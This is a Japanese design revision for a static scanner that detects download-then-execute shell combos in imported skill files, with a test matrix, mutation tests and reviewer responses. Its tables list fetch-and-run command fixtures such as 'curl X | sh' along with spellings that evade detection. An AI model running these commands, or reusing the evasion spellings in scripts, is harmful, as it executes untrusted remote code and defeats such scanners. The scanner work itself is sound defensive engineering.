# 設計 rev2: skill_vuln_scan のコマンド境界一本化（issue #566・族A/族B）

対象: `scripts/lib/skill_vuln_shell.py` / `scripts/lib/skill_vuln_scan.py` / `scripts/lib/skill_vuln_flow.py`
rev2: 2026-08-26。巡4（tacchi + codex・両系統 `設計修正要`）を反映。**リポジトリのコードは無変更**。
頭の裁定4件（性能非 blocking／#570 非マージ条件／prose は対象外明記+テスト固定／`|&` 別 issue）に従う。
実測は忠実プロトタイプ（§2.5。rev2 修正2件を追加適用済み）で本日実行。

**巡4 指摘の判定集計**: tacchi Must-A=採用（裁定3方式）・Should 3件=全採用／codex Must 23件=採用 15・採用しない 4（理由付き）・別 issue 4。全件の個別判定は §9。

---

## 1. round 0 の完成条件（**rev2 で④を根本から書き直した**）

3巡連続で④の抜け道が出た根本原因は、「回避構文の完備列挙」が原理的に不可能なのに、④が代表ケースの列挙で「抜け道が無い」と主張していたこと。rev2 は組み立てを逆にする: **既知の入力クラス全部に明示判定を与えて決定論テストで固定し、「判定の無いクラス（silence）」自体を blocking にする**。

- ①**守る対象**: 取り込みスキル（`root/skills/` 配下）の **shell 実行文脈（fenced/indented code・`.sh`/`.bash`）内・トップレベルのコマンド列**における「リモート取得 → shell 実行」combo が、区切り記号の選び方（`;` `&` `&&` `||` パイプ多段）・コマンドの綴られ方（wrapper operand・PATH 相対多段パス・quote 分割綴り）という表層変形で検出を回避できる状態を無くすこと。**「トップレベルのコマンド列」に限定した**（rev1 の①は範囲を暗黙にしており、入れ子実行文脈・prose まで内側と読めた。縮小した分は②③と §1.1 の matrix で残存として固定する）。
- ②**信頼境界**: 静的・字句レベルで綴られた悪意あるスキル作者/事故コマンド。**`$()`・backtick・subshell・case 分岐・heredoc・prose 内の静的 combo も脅威としては数える**（codex Q5② 採用: これらは動的展開ではない）。ただし本 PR で塞ぐのは①の範囲で、残余は §1.1 の matrix で「MISS固定（既知限界）+ 別 issue」として**明示的に残す**（黙って境界外へ逃がさない）。監査の availability（長大入力での劣化）も脅威に数えるが、扱いは #570（頭の裁定1・2。§7）。動的展開（`$SHELL`・alias・関数・変数間接）は runtime 知識が要るため境界外＝残存リスクとして §10 に記録。
- ③**対象外**（すべて §1.1 の matrix か §10 の別 issue 一覧に対応行を持つ）: B3 homoglyph（別 PR）／`.py` 走査／完全 shell パーサ化／実行時検知／**fence 外 prose の同一行 combo**（頭の裁定3。pipe 型が HIT する既存の非対称もテストで固定）／`memory_guard.scan_text` の入力正規化（§3.6）／`|&`・`$()`/backtick/subshell 内 combo・blockquote 内 fence・継続行 quirk・heredoc pipeline（いずれも別 issue・§10）／`SHELL_EXEC_SUBJECT` の backtracking 根治（#570）。
- ④**blocking の定義**（機械ゲート＋判定表）:
  - **(G1) 完成 matrix（§1.1）の全行が実装 PR の pytest テスト（fail 時 non-zero）で固定されていること**。HIT 行は Finding/FlowFinding の **pattern_id まで** assert、MISS固定/FP固定 行は現挙動を assert（挙動が変わったら気づく）。**matrix に無い入力クラスが発見されたら、行を追加し判定を確定するまでマージ不可**（silence の禁止）
  - (G2) 実コーパス突合: Finding 全6フィールド・FlowFinding 全9フィールドの tuple **list**（set 化禁止）で before/after を比較し、**減少 1 件で blocking**。増分は `true_positive`/`false_positive`/`unresolved` に全件分類し、FP か unresolved が 1 件でも残れば blocking。合成 FP も分類対象
  - (G3) before/after 両方で `scan_errors == []` かつ `evaluated == True`
  - (G4) 一意性: findings は `(rel_path, line, pattern_id)`、**flow_findings は `(rel_path, producer_line, consumer_line, pattern_id, var)`** の Counter で**合成入力（同一行複数 consumer 含む）と実コーパスの両方**に対しちょうど1件を assert（codex Q5④(d) 採用: 実コーパスだけでは合成重複を捕捉しない）
  - (G5) 変異試験: §5 の全変異を **pytest 上の failure-producing test として**実装し（print 目視は不可・codex Q6 採用）、全て赤化。M4（dedup 無効化）は**実装を実際に変異させて**確認（rev1 は推論代用だった＝自認。tacchi が実変異 RED を確認済み、実装 PR で再実行）
  - (G6) 既存テスト2ファイル全緑
  - (G7) 行数: 変更対象3ファイルすべて 800 行未満（`skill_vuln_scan.py` はプロト 766 行で残余 34 行。**実装が 800 に達する場合は分割計画を先に書くまで着手不可**）
  - (G8) 性能: 実コーパス完走＋walltime を PR に実測記録。**注記（tacchi Should 採用・正直に書く）**: 頭の元の要求は「新しい quadratic 入力クラスを増やさない」だったが、B2 拡張は相対パス多段クラスを 2.3 倍悪化させる（§7 実測）。**この条件は頭の裁定1（2026-08-26・§7 に裏取り転記）により「blocking にしない」へ明示的に緩和された**。黙った書き換えではなく裁定による変更である
- ⑤**検証方法**: G1〜G8 それぞれに 1 対 1 対応する**実行可能なコマンド／pytest ファイル**を実装 PR に含める。設計段階の証拠スクリプトは**全文を scratchpad に保存済み**（`proto566/mutation_battery.py` 174 行・`proto566/battery.out`・`proto566/corpus_rev2.out`。§6 の突合スクリプトも corpus_rev2.out の冒頭にヒアドキュメントとして再現可能な形で記録）。codex Q5⑤ 採用: 実装 PR では print-harness を廃し、G1〜G5 を pytest（non-zero exit）へ翻訳する。

### 1.1 完成 matrix（入力クラス × 判定。全行が実装 PR のテストで固定される）

| # | 入力クラス | 代表入力 | 判定 | 実測（プロト・2026-08-26） |
|---|---|---|---|---|
| 1 | `;` 区切り | `curl X -o /tmp/f; sh /tmp/f` | **HIT固定** `fetch_file_to_exec` | HIT (03:55Z) |
| 2 | `&` 区切り | 同 `&` | **HIT固定** 同上 | HIT (03:55Z) |
| 3 | `&&` 区切り | 同 `--output`+`&&` | **HIT固定** 同上 | HIT (03:55Z) |
| 4 | `\|\|` 区切り | `curl X -o /tmp/f \|\| sh /tmp/f` | **HIT固定** 同上（codex Q6-1 採用で追加） | HIT (06:21Z) |
| 5 | パイプ多段 | `curl X \| tee /tmp/f \| sh` | **HIT固定** `curl_pipe_sh` | HIT (03:55Z) |
| 6 | wrapper operand | `curl X \| exec -a foo sh` | **HIT固定** `curl_pipe_sh` | HIT (03:55Z) |
| 7 | PATH 相対多段 | `curl X \| bin/sh` | **HIT固定** `curl_pipe_sh` | HIT (03:55Z) |
| 8 | fetch 側 wrapper 前置 | `env/sudo/time/VAR=1/nohup curl X -o /tmp/f; sh /tmp/f` | **HIT固定**（5種） | 全 HIT (03:55Z) |
| 9 | quote 分割綴り consumer | `curl X -o /tmp/f; b'a'sh /tmp/f` | **HIT固定**（rev2 §3.10 で修正） | HIT (06:21Z) |
| 10 | 同一行複数 consumer | `curl X -o /tmp/f; sh /tmp/f; sh /tmp/f` | **1件固定**（rev2 §3.9 dedup） | 1件 (06:21Z) |
| 11 | `\|&` | `curl X \|& sh` | **MISS固定 → 別 issue**（裁定4・既存穴） | MISS (06:21Z) |
| 12 | `$()`/backtick/subshell 内 combo | `x=$(curl X -o /tmp/f; sh /tmp/f)` 等3種 | **MISS固定 → 別 issue**（①のトップレベル限定の外・§10） | 3種 MISS (06:21Z) |
| 13 | case 分岐またぎ | `case "$x" in a) curl X -o /tmp/f;; b) sh /tmp/f;; esac` | **FP固定**（過剰検出側=安全側。codex Q4-1 は採用しない・理由 §9） | FP を実測で確認 (06:21Z) |
| 14 | prose（fence 外）同一行 `;` | `curl X -o /tmp/f; sh /tmp/f`（地の文） | **MISS固定**（裁定3・③対象外。pipe 型 HIT の非対称もテストで固定） | MISS / pipe 型は HIT (06:21Z) |
| 15 | blockquote 内 fence | `> ```sh` … | **MISS固定 → 別 issue**（既存穴: `_FENCE_OPENER` が `>` container 非対応・`skill_vuln_scan.py:453` を自分で確認済み） | 巡4 codex 実測 |
| 16 | 継続行 quirk | `x=$(printf ")" && curl X` 改行 `\| sh)` | **MISS固定 → 別 issue**（既存穴: `is_shell_continuation` の dq `)` 減算・`skill_vuln_shell.py:205`。splitter は quirk 非継承だが結合入口に届かない） | 巡4 codex 実測・quirk 自体は §2.4 で本番確認済み |
| 17 | heredoc pipeline | `curl X <<EOF \|` / `EOF` / `sh` | **MISS固定**（#555 契約の既知例。既存テスト `test_skill_vuln_scan.py:2487` が固定済み） | 既存テストで固定済み |
| 18 | echo literal | `echo "curl X \| sh"` | **非検出固定**（陽性対照） | GREEN (03:55Z, 06:21Z) |
| 19 | 取得後の非 shell 消費／pipeline 跨ぎ `;` | `curl X \| jq .; sh deploy.sh` 等 | **非検出固定**（C-1 対照） | GREEN (06:21Z) |
| 20 | 順序逆転 | `sh /tmp/f; curl X -o /tmp/f` | **非検出固定**（順序保存） | GREEN (06:21Z) |
| 21 | memory_guard 経由 | `scan_text("echo ok # curl X \| sh")` | **現挙動（HIT）固定**（§3.6・正規化は別 issue） | HIT を本番で確認 (03:52Z) |
| 22 | 長大 segment 行 | `a/`×2000 | **完走を記録**（cap は #570 側で設計・§7） | 3.095s/search (03:57Z) |

---

## 2. 前提の evidence

### 2.1 現状の MISS/HIT（issue 再現コマンド・verbatim）

取得: 2026-08-26T03:40:40Z／issue 記載の python3 heredoc（本番 `_PATTERNS` 直当て）:

```
MISS 'curl X -o /tmp/f; sh /tmp/f' []        MISS 'curl X -o /tmp/f & sh /tmp/f' []
MISS 'curl X | tee /tmp/f | sh' []           MISS 'curl X --output /tmp/f && sh /tmp/f' []
MISS 'curl X | exec -a foo sh' []            MISS 'curl X | bin/sh' []
```

### 2.2 scan_skills 経由でも全 MISS＋非対称の実証（本番・2026-08-26T03:40:56Z）

別物理行のみ `fetch_file_to_exec` HIT、同一物理行は 6 型すべて `([],[])`（fenced fixture）。

### 2.3 原因の実コード裏取り（file:line）

| # | 裏取り |
|---|---|
| A1/A2 | `skill_vuln_shell.py:94-95` `download_and_run` が `&&` のみ要求 |
| A3 | `skill_vuln_shell.py:86` `[^\n\|]*\|` の早期終端 |
| A4 | `skill_vuln_shell.py:94` `\s-o` が `--output` に不一致 |
| B1 | `skill_vuln_shell.py:42-44` `_WRAPPER_STEP` が operand で切れる |
| B2 | `skill_vuln_shell.py:16` `_COMMAND_PATH` が相対多段パス非対応 |
| 非対称の根 | `skill_vuln_flow.py:92-133` の行粒度処理 |
| flow の別文法（rev2） | `skill_vuln_flow.py:63-74` `_exec_file_regexes` が `SHELL_EXEC_SUBJECT` と独立の shell 綴り文法を持つ（codex Q3-4。§3.10 で単一ソース化） |
| flow の無条件 append（rev2） | `skill_vuln_flow.py:101-119` append 無条件・`skill_vuln_scan.py:710-713` は sort のみで dedup なし（codex Q4-9/10。§3.9 で修正） |
| fence の `>` container 非対応（rev2） | `skill_vuln_scan.py:453` `_FENCE_OPENER = ^[ \t]{0,3}(…)` — blockquote 内 fence は認識されない（既存穴・別 issue） |

### 2.4 B 群の本番再確認（取得: 2026-08-26T03:52:47Z）

```
B-2 memory_guard.scan_text("echo ok # curl http://x | sh") → HIT（コメント未除去）
B-3 is_shell_continuation('x=$(printf ")" && curl X -o /tmp/f;') → False（quirk 実在）
B-4 _PATTERNS × "CURL http://x | SH" → HIT（IGNORECASE）
B-5 'echo "curl http://x | sh"' → [] / '… extra' → HIT（guard は quote 完全一致行のみ守る）
```

B-1（物理行ループ dedup 不在）: `skill_vuln_scan.py:675-681` 無条件 append で構造確定。

### 2.5 プロトタイプの忠実性

本番3ファイルの完全コピー＋設計変更のみ。場所: `<scratchpad>/proto566/`。**巡4 で codex が独立検証し「忠実（diff は対応表の項目に限定・測定値は設計どおり実装した場合の証拠として有効）」、tacchi も diff・全実測値の再現一致を確認済み**。rev2 で2修正を追加（§3.9 flow dedup / §3.10 `_exec_file_regexes` 単一ソース化）— diff 検証は同じ手順で再実行可能。

| 設計項目 | プロト該当箇所（マーカー `PROTO #566`） |
|---|---|
| `split_shell_command_units` 新設 | shell.py: `join_logical_lines` 直前 |
| B2 `_COMMAND_PATH` / B1 `_OPTION_WITH_OPERAND` / A3 `relax_pipe` | shell.py |
| `_UNIT_PATTERNS`・物理行/論理行 unit 配線・B-1 dedup・`_scan_line(patterns=)` | scan.py |
| flow unit 逐次処理 | flow.py |
| **rev2: flow dedup（`_append_dedup`・seen キー=(pattern_id, producer_line, consumer_line, var)）** | flow.py |
| **rev2: `_exec_file_regexes` の shell 綴りを `_SHELL_COMMAND` 化（先頭境界 lookbehind 付き）** | flow.py |

非忠実部分: `_process_flow_unit` の `if True:` 残骸（機械抽出・分岐を変えない。codex も確認。実装で除去=Nit）。

### 2.6 実コーパス before 集合

取得: 2026-08-26T03:55:16Z（§6 rev1 突合）・06:22Z〜（rev2 再突合 §6）:
scanned=1351 / scan_errors=[] / evaluated=True / findings=6 / flow_findings=157。

### 2.7 行数（変更対象3ファイル全部）

取得: 2026-08-26T04:04Z＋rev2 修正後（06:21Z 時点の `wc -l` 相当）:
shell 340→**431** / scan 721→**766** / flow 141→**176**（rev2 の dedup・単一ソース化で +18）。scan.py は 800 まで残余 34 行 — G7 のとおり実装で超過が見えたら分割計画先行。

### 2.8 既存テストの所在

`scripts/lib/tests/test_skill_vuln_scan.py`（2536行）・`test_skill_vuln_shell.py`（345行）。

---

## 3. 設計本体

### 3.1 方針の一文

4つ目の単一ソース「コマンド境界」`split_shell_command_units` を `skill_vuln_shell.py` に新設し、(a) 物理行/論理行スキャン (b) flow 解析の両方を unit 単位へ配線する。族Aは境界分割＋既存 flow 機構への合流、族Bは `SHELL_EXEC_SUBJECT` の文法拡張。**rev2 で flow 側にも (c) 実行主体綴りの単一ソース共有 (d) FlowFinding dedup を追加**。

### 3.2 新設する単一ソース

```python
def split_shell_command_units(text: str) -> List[str]:
    """コメント除去済みの1論理行をトップレベルのコマンド単位に分割。
    区切り: `;`（`;;` 含む）・`&&`・`||`・単独 `&`。単独 `|` は分割しない。
    `>&` `<&` `|&` `&>` の `&` は区切りにしない。quote/escape/$()/backtick/( ) の内側は
    境界にしない（トップレベル限定＝①のスコープと一致。入れ子文脈の内側は matrix #12）。
    double quote 内の `)` で深度を減らさない（is_shell_continuation の quirk 非継承）。"""
```

- **「1つの繋がり」**: pipe consumer は同一 pipeline（1 unit）内のみ。`;` `&` `&&` `||` を跨いだ後続は pipe consumer にしない。ファイル consumer は行内 unit 順序を保存（順序逆転は非検出・実測済み）。
- 判定不能な構文は「分割しない」側（unit が大きくても行全体照合と同等の検査は残る）。

### 3.3 既存要素の書き換え対応表（rev1 §3.3 に同じ。差分のみ）

rev1 の表に加え:

| 既存 | 変更 | 理由 |
|---|---|---|
| `_exec_file_regexes`（flow.py:63） | shell 綴り部分 `(?:(?:ba\|z\|k\|d\|a)?sh\|…)` を **`_SHELL_COMMAND`（quote 許容 static word + path）へ差し替え**。`_SHELL_COMMAND` は先頭 `\b` を持たないため `(?:^\|(?<=[\s;&\|(\`]))` の境界を前置。`source/python3?/node/perl/ruby` は従来どおり | codex Q3-4/Q4-5 採用: flow が主要経路になった以上、実行主体の綴り文法は単一ソースでなければ `b'a'sh` 型で非対称が残る。**実測: `curl X -o /tmp/f; b'a'sh /tmp/f` が rev2 で HIT**（06:21Z）。157 不変は §6 で再突合 |
| `detect_flows_in_scope` | **FlowFinding を `(pattern_id, producer_line, consumer_line, var)` キーで dedup してから append**（`_append_dedup`） | codex Q4-9/10 採用: unit 化で同一行複数 consumer が可能になり、同一全フィールドの重複が出る（本設計導入の欠陥）。**実測: `…; sh /tmp/f; sh /tmp/f` が dedup 後ちょうど1件**（06:21Z）。before は行粒度で同一 pair が複数出ない構造のため挙動不変（§6 で検証） |

### 3.4 各ケースの捕捉点

§1.1 matrix の #1〜#10 の実測列がそのまま対応表（旧 rev1 §3.4 を matrix に統合）。

### 3.5 quote / heredoc / コメント内の区切り誤認防止

rev1 と同じ（separator 端例 14 種・冪等性 860,054 行違反 0・取得 03:58:15Z）。

### 3.6 `memory_guard.scan_text` への影響

`memory_guard.py:178` は生行を `_scan_line` へ渡す。`patterns` 引数は既定値付きのため**挙動完全不変**（unit 化の恩恵なし・matrix #21 で固定）。正規化は別 issue（codex Q4-6 も同判定）。

### 3.7 C-2（anchored 回避）非該当の構造理由と立証

flow の `FLOW_FETCH_TO_FILE.search()` は非 anchored。5 prefix 全 HIT 実測（03:55:01Z・matrix #8）。

### 3.8 逸脱の明示

A3 のみ relax 引数方式（rev1 §3.8 のまま・F-1 実測が根拠）。

---

## 4. #379 新設凍結との整合

新 store / observability section / advisory adapter / weak_signal channel なし。rev2 の2修正も既存関数の内部変更のみ。codex Q4-8 も「現設計は成立」と確認済み。

---

## 5. 陰性試験と陽性対照（rev2: pytest 化を実装条件へ）

### 5.1 実行済み変異（設計段階の証拠。**実装 PR では全件を pytest の failure-producing test へ翻訳する**＝G5）

rev1 の M1〜M6（10 変異・全 RED・03:55Z〜04:03Z・再現 `proto566/mutation_battery.py`）に加え、巡4 対応:

| # | 変異/fixture | 対応 |
|---|---|---|
| M4' | **dedup 実装そのものの変異**（rev1 M4 は推論代用と自認）。tacchi が実変異で RED を確認済み。実装 PR の陰性試験に「unit-dedup 無効化で2件」を追加（scan 側）＋**flow dedup 無効化で matrix #10 が2件になる**変異（rev2 新設） | tacchi Should / codex Q6 採用 |
| M7 | `\|\|` 境界の分岐無効化 → matrix #4 fixture（HIT 実測済み 06:21Z）が赤化 | codex Q6-1 採用（rev1 では fixture 不在で緑残だった） |
| M8 | plain subshell `( )` の depth 追跡を外す → `(a; b)` が `["(a","b)"]` に誤分割される fixture で赤化 | codex Q6-2 採用 |
| M9 | flow の `_exec_file_regexes` 単一ソース共有を旧文法に戻す → matrix #9（`b'a'sh`）が赤化 | rev2 修正の検査経路 |
| oracle 再定義 | M5 の backtick/`$()`「分割しないこと」を正とする試験は、**入れ子文脈内 combo の検出回避を固定する側面を持つ**（codex Q6 指摘は正しい）。rev2 ではこれらを「①トップレベル限定の**既知限界の固定**」と再定義し、matrix #12 の MISS固定テストと**必ず対で**管理する（片方だけでは意味が逆転する）。入れ子文脈の検出強化は別 issue（§10） | codex Q6 採用 |

harness の欠陥（print のみ・non-zero exit なし）は自認し、G5 で pytest 化を blocking にした。

### 5.2 陽性対照

matrix #18〜#20 ＋ `gh api … | base64 -d > f.txt`（GREEN 実測済み）＋既存 FP 対照テスト全件（G6）。rev2 回帰: 6ケース＋陽性対照5種を rev2 プロトで再実測し全て期待どおり（06:21Z）。

### 5.3 探索した入力クラス

§1.1 matrix が正典（rev1 §5.3 の列挙を matrix に統合）。matrix 外の新クラス発見時は G1 のルールで行追加。

---

## 6. 偽陽性の実測（rev2 再突合）

rev1 突合（03:55:16Z）: findings 6・flow 157 とも全フィールド不変・増減0・dedup 違反0・scan_errors=[]・evaluated=True 両側。
**rev2 再突合**（§3.9/§3.10 適用後・実行 06:22Z〜・スクリプト全文と結果は `proto566/corpus_rev2.out` に保存）: 結果は本文書末尾の「rev2 再突合結果」に転記（実行中に本文書を改訂したため、完了後に転記した値が正）。期待値: 全フィールド不変（`_exec_file_regexes` の綴り拡張は quote 分割綴りという実コーパスに現れない筈のクラスのみ広げ、dedup は同一キー重複のみ畳むため）。**増減が出た場合は G2 の3分類を全件実施**。

---

## 7. 性能（E）

- **頭の裁定1（2026-08-26）: 性能 +92% は blocking にしない。** 頭の裏取り（本ワーカーも 2026-08-26T06:20Z に再実行して確認）:
  `grep -rn "scan_skills" scripts hooks`（test 除く）→ 呼び出し元は **`scripts/lib/audit/sections_skill_vuln.py:33` の1箇所のみ**。hook からは呼ばれない＝セッション開始・対話をブロックしない。人が診断コマンドを明示的に叩いたときだけ走る。
- **codex Q1 の関連事実（採用しないが事実として併記・自分で裏取り済み 06:20Z）**: `skills/evolve/scripts/evolve/phases_diagnose.py:254`（`run_audit` 同期実行）・同 `:277`（`collect_observability`）・`scripts/lib/fleet/audit_runner.py:156`（fleet audit の既定 `timeout: float = 10.0`）は実在する。いずれも**人が明示起動する診断経路**であり裁定1の判断を変えないが、fleet 経由では timeout 10s により audit が `timeout` status になる可能性がある。**この情報は #570 に添付し、cap／timeout 協調の設計材料とする**。
- **#570（backtracking 根治）は #566 のマージ条件にしない**（裁定2）。「本変更固有の回帰解消をマージ条件に」という codex Q1 の残部も採用しない（同裁定。検出穴を塞ぐ方が先）。
- 実測（同一入力クラス before/after・03:57:34Z）: 絶対パス2000seg 2.544→2.590s（不変）／**相対パス2000seg 1.359→3.095s（2.3倍・B2 拡張の新規悪化）**／plain 0.005→0.012s。実コーパス walltime 70.2→135.0s（+92%・04:03:43Z）。tacchi が walltime 2.04x を独立再現。
- **④(h)→G8 の緩和は裁定によるものであることを G8 に明記した**（tacchi Should 採用）。
- 打ち切り上限（cap）は本 PR に入れない（rev1 の理由3点を維持）。cap と「検査不能の surface」設計は #570 側で fleet timeout 事実と併せて行う。

---

## 8. リスクと未実測

- rev2 の `_exec_file_regexes` 変更の実コーパス影響: **不変を確認済み**（§6 rev2 再突合・06:22Z・増減0）。
- `exec -a sh realcmd` の過剰検出リスク（rev1 リスク2・陽性対照へ追加予定）。
- 表示層の同一行 pair は **codex が確認済み（`sections_skill_vuln.py:102` で 12→12 を正常描画・sort 決定論）**。rev1 の「未確認」を削除し、同一行表示の回帰テスト1件を G1 に含める（codex Q3-6 Should 採用）。
- 実装と プロトの最終差分はゼロ検証（G2 再実行・機械 diff）で吸収。

---

## 9. 巡4 指摘の個別判定（沈黙で消さない）

### tacchi

| 指摘 | 判定 |
|---|---|
| [Must-A] prose 非対称 | **採用（裁定3方式）**: ③に対象外を明記・matrix #14 で MISS固定＋pipe 型 HIT の非対称もテスト固定（G1） |
| [Should] `\|&` | **別 issue**（裁定4・matrix #11） |
| [Should] M4 実変異 | **採用**: §5.1 M4'（実装 PR の陰性試験に追加） |
| [Should] ④(h) 緩め明記 | **採用**: G8 に裁定による緩和である旨を明記 |
| [Nit] `if True:` 残骸 | 実装で除去 |

### codex（Must 23 件。M04/M09 は同一族のため1行に統合して 23 行）

| # | 指摘 | 判定 |
|---|---|---|
| 1 | Q1: 性能+92%は blocking／④(h)は round 0 逆転 | **採用しない**（頭の裁定1。裏取り転記 §7。④(h) の「緩めた事実の明記」だけ採用=G8） |
| 2 | Q1: #566 自身の回帰解消・増加次数測定・surface テストをマージ条件に | **採用しない**（裁定1・2。#570 へ材料添付） |
| 3 | Q3-1: `$()` 内 combo 未解消 | **別 issue**（①をトップレベル限定に明示縮小・matrix #12 で MISS固定） |
| 4 | Q3-4/Q4-5: 実行主体の単一ソース不成立（`b'a'sh`） | **採用して直した**（§3.10・HIT 実測 06:21Z・matrix #9） |
| 5 | Q3-5: prose 非対称 | **採用（裁定3方式）**（matrix #14） |
| 6 | Q4-1: case 分岐またぎ FP | **採用しない**（過剰検出側=安全側に倒す既存方針。完全 parser は対象外。ただし **FP であることを matrix #13 で固定しテストで刻む**＝挙動が変わったら気づく） |
| 7 | Q4-2: blockquote 内 fence | **別 issue**（既存穴・本設計の導入物でない。`skill_vuln_scan.py:453` 自分で確認済み） |
| 8 | Q4-3: 継続行 quirk で結合不発 | **別 issue**（既存穴 `skill_vuln_shell.py:205`。splitter は quirk 非継承・matrix #16） |
| 9 | Q4-9: flow 重複 | **採用して直した**（§3.9・1件固定を実測 06:21Z） |
| 10 | Q4-10: FlowFinding 一意性・決定論 | **採用して直した**（§3.9 + G4 で合成入力にも Counter assert） |
| 11 | Q4-11: `\|&`（+subshell 1unit MISS） | **別 issue**（裁定4・matrix #11/#12） |
| 12 | Q4 追加: availability surface（長大行・fleet 10s） | **採用しない**（裁定1・2。事実は裏取りの上 #570 へ添付・§7） |
| 13 | Q5①: ①が機械 blocking で守られていない | **採用して直した**（①のスコープ明示化＋G1 matrix 方式） |
| 14 | Q5②: 信頼境界の過小評価（静的実行文脈・availability） | **採用して直した**（②書き直し: 脅威に数えた上で残存を明示固定） |
| 15 | Q5③: 対象外が本変更の回帰・境界関数が扱う構文を免責 | **採用して直した**（③の全項目に matrix/別 issue の対応行・completion matrix に残存固定） |
| 16 | Q5④: (a)(d)(e)(f)(h) の抜け道 | **採用して直した**（④全面書き直し=G1〜G8。(d)=合成入力 assert、(f)=pytest 化、(h)=裁定明記） |
| 17 | Q5⑤: 検証手順が1対1・再現可能でない | **採用して直した**（⑤: スクリプト全文保存＋pytest 翻訳を blocking に） |
| 18 | Q6: M4 が実変異でない | **採用して直した**（M4'。tacchi の実変異 RED 確認も記録） |
| 19 | Q6: harness に assert/non-zero exit がない | **採用して直した**（G5） |
| 20 | Q6: M5 oracle の逆転（回避の固定化） | **採用して直した**（§5.1 oracle 再定義・matrix #12 と対で管理） |
| 21 | Q6-1: `\|\|` 変異が緑残 | **採用して直した**（matrix #4 fixture・HIT 実測・M7） |
| 22 | Q6-2: subshell depth 変異が緑残 | **採用して直した**（M8 fixture 追加） |
| 23 | Q2 Should: 実装とプロトの機械 diff／同一 harness 再実行 | **採用**（G2・§8。Must でないが対応を明記） |

---

## 10. 別 issue へ落とすもの（頭が起票）

1. **`|&` の separator/regex 非対応**（matrix #11・既存穴・裁定4）
2. **入れ子実行文脈（`$()`・backtick・subshell）内の combo 検出**（matrix #12。①のトップレベル限定の外。splitter の再帰化 or 入れ子文脈の別スキャンを設計する）
3. **blockquote 内 fenced code の fence 認識**（matrix #15・既存穴 `skill_vuln_scan.py:453`）
4. **`is_shell_continuation` の double-quote `)` quirk による論理行結合不発**（matrix #16・既存穴 `skill_vuln_shell.py:205`）
5. **`memory_guard.scan_text` の入力正規化**（matrix #21・既存の別境界）
6. **#570（既存）へ追記**: fleet audit timeout 10s の事実・cap/検査不能 surface の設計・相対パスクラスの 2.3 倍悪化データ（§7）
7. **動的展開（`$SHELL`・alias・関数・変数間接）**: 残存リスクとして記録（静的検査の原理的限界・②）

heredoc pipeline（matrix #17）は #555 契約の既存テストが固定済みのため新規起票なし（既知例として matrix に固定）。

---

## rev2 再突合結果（§6 の転記・verbatim。取得 2026-08-26T06:22:14Z〜・再現 `proto566/corpus_rev2.out` にスクリプト同梱）

```
before: 1351 [] True 6 157
after : 1351 [] True 6 157
（F-/F+/W-/W+ の差分行なし = findings 6・flow 157 とも全フィールド不変・増減0）
dupF: {}   dupW: {}
```

→ rev2 の2修正（flow dedup・`_exec_file_regexes` 単一ソース化）後も実コーパスは完全不変。G2/G3/G4 を rev2 プロトで充足。§8 の「未確定」は解消。
